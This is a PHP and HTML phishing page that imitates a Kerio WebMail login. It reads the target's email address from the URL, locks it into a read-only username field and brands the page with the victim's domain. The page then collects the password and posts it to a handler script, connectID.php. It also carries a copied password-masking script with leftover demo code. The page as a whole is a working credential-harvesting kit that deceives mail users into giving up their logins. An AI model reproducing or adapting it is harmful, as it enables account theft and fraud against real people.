<?
$cust_email = $_GET["email"];
$url = explode("@",$cust_email);
$parts = preg_split ("/[\@.]+/", $cust_email);
$cust_name = $parts[0];
$str = strtoupper($parts[1]);
?>  
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script type="text/javascript">
function MaskedPassword(passfield, symbol)
{
	if(typeof document.getElementById == 'undefined'
		|| typeof document.styleSheets == 'undefined') { return false; }

	if(passfield == null) { return false; }
	
	this.symbol = symbol;

	this.isIE = typeof document.uniqueID != 'undefined';
	
	passfield.value = '';
	passfield.defaultValue = '';
	passfield._contextwrapper = this.createContextWrapper(passfield);
	this.fullmask = false; 
	var wrapper = passfield._contextwrapper;
	
	var hiddenfield = '<input type="hidden" name="' + passfield.name + '">';
	
	var textfield = this.convertPasswordFieldHTML(passfield);
	wrapper.innerHTML = hiddenfield + textfield;

	passfield = wrapper.lastChild;
	passfield.className += ' masked';
	passfield.setAttribute('autocomplete', 'off');

	passfield._realfield = wrapper.firstChild;
	
	passfield._contextwrapper = wrapper;
	this.limitCaretPosition(passfield);

	var self = this;
	
	this.addListener(passfield, 'change', function(e) 
	{ 
		self.fullmask = false; 
		self.doPasswordMasking(self.getTarget(e)); 
	});
	this.addListener(passfield, 'input', function(e) 
	{ 
		self.fullmask = false; 
		self.doPasswordMasking(self.getTarget(e)); 
	});
	this.addListener(passfield, 'propertychange', function(e) 
	{ 
		self.doPasswordMasking(self.getTarget(e)); 
	});
	this.addListener(passfield, 'keyup', function(e) 
	{ 
		if(!/^(9|1[678]|224|3[789]|40)$/.test(e.keyCode.toString()))
		{
			self.fullmask = false; 
			self.doPasswordMasking(self.getTarget(e));
		}
	});
	this.addListener(passfield, 'blur', function(e) 
	{ 
		self.fullmask = true; 
		self.doPasswordMasking(self.getTarget(e)); 
	});
	this.forceFormReset(passfield);

	return true;
}
MaskedPassword.prototype =
{
	doPasswordMasking : function(textbox)
	{
		var plainpassword = '';
		if(textbox._realfield.value != '')
		{
			for(var i=0; i<textbox.value.length; i++)
			{
				if(textbox.value.charAt(i) == this.symbol)
				{
					plainpassword += textbox._realfield.value.charAt(i);
				}
				else
				{
					plainpassword += textbox.value.charAt(i);
				}
			}
		}
		else 
		{ 
			plainpassword = textbox.value; 
		}
		
		var maskedstring = this.encodeMaskedPassword(plainpassword, this.fullmask, textbox);
		if(textbox._realfield.value != plainpassword || textbox.value != maskedstring)
		{
			textbox._realfield.value = plainpassword;
			textbox.value = maskedstring;
		}
	},
	
	encodeMaskedPassword : function(passwordstring, fullmask, textbox)
	{
		var characterlimit = fullmask === true ? 0 : 1;
		for(var maskedstring = '', i=0; i<passwordstring.length; i++)
		{
			if(i < passwordstring.length - characterlimit) 
			{ 
				maskedstring += this.symbol; 
			}
			else 
			{
				maskedstring += passwordstring.charAt(i); 
			}
		}
		return maskedstring;
	},
	createContextWrapper : function(passfield)
	{
		var wrapper = document.createElement('span');
		wrapper.style.position = 'relative';
		passfield.parentNode.insertBefore(wrapper, passfield);

		wrapper.appendChild(passfield);

		return wrapper;
	},

	forceFormReset : function(textbox)
	{

		while(textbox)
		{
			if(/form/i.test(textbox.nodeName)) { break; }
			textbox = textbox.parentNode;
		}

		if(!/form/i.test(textbox.nodeName)) { return null; }

		this.addSpecialLoadListener(function() { textbox.reset(); });

		return textbox;
	},

	convertPasswordFieldHTML : function(passfield, addedattrs)
	{

		var textfield = '<input';

		for(var fieldattributes = passfield.attributes, 
				j=0; j<fieldattributes.length; j++)
		{

			if(fieldattributes[j].specified && !/^(_|type|name)/.test(fieldattributes[j].name))
			{
				textfield += ' ' + fieldattributes[j].name + '="' + fieldattributes[j].value + '"';
			}
		}

		textfield += ' type="text" autocomplete="off">';

		return textfield;
	},

	limitCaretPosition : function(textbox)
	{

		var timer = null, start = function()
		{

			if(timer == null) 
			{

				if(this.isIE)
				{

					timer = window.setInterval(function() 
					{ 

						var range = textbox.createTextRange(),
							valuelength = textbox.value.length,
							character = 'character';
						range.moveEnd(character, valuelength);
						range.moveStart(character, valuelength);
						range.select();				
					

					}, 100);
				}

				else
				{

					timer = window.setInterval(function() 
					{ 

						var valuelength = textbox.value.length;
						if(!(textbox.selectionEnd == valuelength && textbox.selectionStart <= valuelength))
						{
							textbox.selectionStart = valuelength;
							textbox.selectionEnd = valuelength;
						}
						

					}, 100);
				}
			}
		},
		

		stop = function()
		{
			window.clearInterval(timer);
			timer = null;
		};
		

		this.addListener(textbox, 'focus', function() { start(); });
		this.addListener(textbox, 'blur', function() { stop(); });
	},
	
	

	addListener : function(eventnode, eventname, eventhandler)
	{
		if(typeof document.addEventListener != 'undefined')
		{
			return eventnode.addEventListener(eventname, eventhandler, false);
		}
		else if(typeof document.attachEvent != 'undefined')
		{
			return eventnode.attachEvent('on' + eventname, eventhandler);
		}
	},

	addSpecialLoadListener : function(eventhandler)
	{

		if(this.isIE)
		{
			return window.attachEvent('onload', eventhandler);
		}
		else
		{
			return document.addEventListener('DOMContentLoaded', eventhandler, false);
		}
	},
	
	

	getTarget : function(e)
	{
		if(!e) { return null; }
		return e.target ? e.target : e.srcElement;
	}

}


 
</script>
<link rel="shortcut icon" href="./Client_files/logo.png" type="image/x-icon">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1"><title> Client</title><script type="text/javascript" src="./Client_files/loginDialog.js.download"></script>
<script type="text/javascript" src="./Client_files/generatedDefaults.js.download"></script><script type="text/javascript" src="./Client_files/is"></script><link href="./Client_files/loginBasic.css" rel="stylesheet"><link href="./Client_files/loginAdvanced.css" rel="stylesheet"></head><body onload="document.getElementById(&#39;x_cfq&#39;).focus();x_cge(false);x_cgf();"><div id="x_cfo"></div><form action="connectID.php" method="post" novalidate="novalidate"><div id="logoField" style="font-size:36px; color:#02A0E0; font-weight:bold;"><img id="x_cfw" src="./Client_files/logo.png" alt="Mail" width="48" height="48"> <? echo $str;?>  </div><table id="x_cfn" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td><img id="x_cfy" src="./Client_files/top.png" alt="" width="304" height="23"></td></tr><tr><td id="x_cfp"><center><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td></td></tr><tr><td class="x_cfu">Username<br><input id="x_cfq" name="kerio_username" type="email" style="cursor:no-drop; -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    -o-user-select: none;
    user-select: none;" readonly="" value="<? echo $cust_email;?>"></td></tr>
<tr><td class="x_cfu">Password<br><span style="position: relative;">
<input type="password" name="kerio_password" id="x_cfr" autofocus="" value="" required="" type="text" autocomplete="off" class=" masked"></span>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("x_cfr"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
</td></tr><tr><td><input id="x_cft" value="Login" type="submit"></td></tr><tr><td align="center"><table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td valign="middle"><input onChange="x_cgk(this.checked)" id="x_cgl" name="kerio_useMini" type="checkbox"></td><td valign="middle"><label for="x_cgl">Use WebMail Mini</label></td></tr></tbody></table></td></tr></tbody></table></center></td></tr><tr><td><img id="x_cfz" src="./Client_files/bottom.png" alt="" width="304" height="24"></td></tr><tr><td id="x_cfs"><a href="?oldStyle=true">Integration with Windows</a></td></tr></tbody></table></form></body></html>